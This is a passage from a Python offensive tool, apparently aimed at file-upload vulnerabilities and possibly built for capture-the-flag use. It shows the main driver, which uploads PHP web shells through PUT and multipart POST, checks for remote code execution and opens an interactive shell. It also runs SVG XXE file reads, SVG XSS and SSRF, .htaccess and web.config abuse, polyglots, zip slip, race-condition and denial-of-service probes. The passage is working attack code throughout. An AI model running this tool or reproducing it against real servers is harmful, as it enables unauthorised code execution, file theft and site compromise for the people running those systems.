            ok(f"Auto-detected field: {upload_field}")
        else:
            warn(f"Could not auto-detect field — using default: {upload_field}")

    upload_url, effective_target = smart_endpoint(target, upload_endpoint)
    if effective_target != target:
        info(f"Endpoint points to a different host — effective target swapped: "
             f"{target} → {effective_target}")
        target = effective_target
        sm.target = target

    # ── Build attacker ────────────────────────────────────────────────────────
    atk = UploadAttacker(
        sm          = sm,
        upload_url  = upload_url,
        shell_dirs  = list(args.shell_dirs),
        cmd_param   = args.cmd_param,
        field       = upload_field,
        flag_path   = args.flag,
        verbose     = args.verbose,
        disc        = d,
        interactive = args.interactive,
    )
    # --extra-field NAME=VALUE  → multipart fields added to every upload
    atk.default_extra_fields = {}
    for kv in (args.extra_fields or []):
        if "=" in kv:
            k, v = kv.split("=", 1)
            atk.default_extra_fields[k.strip()] = v.strip()
    if atk.default_extra_fields:
        info(f"Extra multipart fields: {atk.default_extra_fields}")

    print(f"\n{B}  Target        : {target}")
    print(f"  Upload URL    : {upload_url}")
    print(f"  Upload field  : {upload_field}")
    print(f"  Shell dirs    : {len(atk.shell_dirs)} paths")
    print(f"  Flag path     : {args.flag}")
    print(f"  Report        : {args.output}{W}\n")

    # ── --attack-all: drive every discovered endpoint ────────────────────────
    if args.attack_all and all_endpoints:
        info(f"--attack-all: driving {len(all_endpoints)} endpoint(s)")
        mea = MultiEndpointAttacker(endpoints=all_endpoints,
                                    transport=transport,
                                    session=sm.session, disc=d)
        # Re-target the existing attacker at each endpoint in turn.
        # We keep the same atk so its discovered_paths / verifier accumulate.
        per_ep_results = []
        for ep in all_endpoints:
            atk.upload_url = ep.url if ep.url.startswith("http") else join_url(target, ep.url)
            atk.field      = ep.field or "file"
            info(f"\n{C}{BOLD}=== Endpoint {ep.method} {atk.upload_url}  "
                 f"(field={atk.field}, score={ep.score}, src={ep.source}) ==={W}")
            if ep.method == "PUT":
                # WebDAV: just upload one shell, then verify
                target_url = atk.upload_url if not atk.upload_url.endswith("/") \
                             else atk.upload_url + "shell.php"
                try:
                    r = sm.session.put(target_url, data=SHELLS["standard"],
                                       headers={"Content-Type": "application/x-php"},
                                       timeout=transport.timeout)
                    per_ep_results.append({"url": target_url, "status": r.status_code})
                    if r.status_code in (200, 201, 204):
                        ok(f"PUT accepted at {target_url}")
                        rce_ok, url, param, out = atk.verify_rce("shell.php")
                        if rce_ok:
                            atk.launch_shell("shell.php", url, param, out,
                                             "standard", "application/x-php")
                except Exception as e:
                    fail(f"PUT error: {e}")
            else:
                # POST multipart: run polyglots + parser-confusion + matrix per endpoint
                if not d.rce:
                    atk.attack_polyglots()
                if not d.rce:
                    atk.attack_parser_confusion()
                if not d.rce:
                    atk.attack_matrix()
                per_ep_results.append({"url": atk.upload_url, "rce": bool(d.rce)})
            if d.rce and not args.exhaust:
                break
        print(f"\n{C}{BOLD}  ENDPOINT-BY-ENDPOINT SUMMARY{W}")
        for r in per_ep_results:
            print(f"    {r}")
        if args.cleanup:
            deleted, remaining = cleanup_artifacts(d, sm.session, target, attacker=atk)
            info(f"--cleanup: removed {deleted} artifact(s), {remaining} remain")
        d.print_report(); d.save()
        sys.exit(0 if d.rce else 1)

    # ── Filter fingerprint ────────────────────────────────────────────────────
    if not args.no_probe:
        probe = FilterProbe(atk.upload, d, upload_field)
        probe.probe_all()

    run_all = args.all

    # ── Run modules ───────────────────────────────────────────────────────────
    if args.discover or run_all:
        atk.discover_all(sm.upload_page)

    if args.svg_read or run_all:
        atk.attack_svg_xxe_read(args.svg_read or args.flag)

    if args.svg_src or run_all:
        atk.attack_svg_xxe_source(args.svg_src or "upload.php")

    if args.svg_xss or run_all:
        s,b,_ = atk.upload("xss.svg", SVG_XSS, "image/svg+xml")
        if atk.is_success(s,b):
            ok("SVG XSS uploaded")
            if d: d.log("SVG XSS","found","XSS payload uploaded")

    if args.svg_ssrf or run_all:
        url = args.svg_ssrf or "http://127.0.0.1/"
        s,b,_ = atk.upload("ssrf.svg", SVG_SSRF(url), "image/svg+xml")
        if atk.is_success(s,b):
            ok(f"SVG SSRF uploaded → {url}")

    if args.htaccess or run_all:
        atk.attack_htaccess()

    if (args.polyglots or run_all) and not d.rce:
        atk.attack_polyglots()

    if (args.parser_confusion or run_all) and not d.rce:
        atk.attack_parser_confusion()

    if (args.nginx_tricks or run_all) and not d.rce:
        atk.attack_nginx_tricks()

    if (args.webconfig or run_all) and not d.rce:
        atk.attack_webconfig()

    if args.zip or run_all:
        atk.attack_zip_slip()

    if args.race or run_all:
        atk.attack_race()

    if args.dos or run_all:
        atk.attack_dos_probe()

    # Matrix always runs (unless something already found)
    if not d.rce:
        if args.matrix or run_all or not any([
            args.htaccess, args.svg_read, args.svg_src, args.svg_xss,
            args.svg_ssrf, args.race, args.zip, args.dos, args.discover,
            args.polyglots, args.parser_confusion, args.nginx_tricks, args.webconfig,
        ]):
            atk.attack_matrix()

    # ── Optional cleanup pass ────────────────────────────────────────────────
    if args.cleanup:
        deleted, remaining = cleanup_artifacts(d, sm.session, target, attacker=atk)
        info(f"--cleanup: removed {deleted} artifact(s), {remaining} remain")

    # ── Final report ──────────────────────────────────────────────────────────
    d.print_report()
    d.save()
    sys.exit(0 if d.rce else 1)


def _entrypoint():
    """Wrap main() to translate budget/network failures into stable exit codes."""
    try:
        main()
    except RequestBudgetExceeded as e:
        fail(str(e))
        sys.exit(4)
    except requests.exceptions.ConnectionError as e:
        fail(f"Network unreachable: {e}")
        sys.exit(3)
    except KeyboardInterrupt:
        fail("Interrupted by operator.")
        sys.exit(130)


if __name__ == "__main__":
    _entrypoint()
